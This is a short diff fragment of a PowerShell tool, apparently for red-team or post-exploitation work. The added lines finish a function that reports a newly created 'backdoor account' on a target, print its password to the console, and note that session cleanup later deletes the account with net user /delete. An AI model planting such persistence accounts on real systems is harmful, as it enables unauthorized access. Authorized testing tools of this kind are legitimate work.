+    Write-Host ('  account : ' + $accountName) -ForegroundColor Gray
+    Write-Host ('  password: ' + $password) -ForegroundColor Gray
+    Write-Host '  shown here only: the password is never written to the log file.' -ForegroundColor DarkGray
+    Write-ARInfo ('Cleanup: ' + $accountName + ' is in the account ledger, so session cleanup deletes it with net user /delete.')
+    Write-ARInfo 'The password also travelled in the net.exe command line on the target, so it is visible there while the call runs.'
+    Set-ARStatus 'Backdoor account created' 'Ok'
 }
 
 function Show-ARLineLanguagePicker {
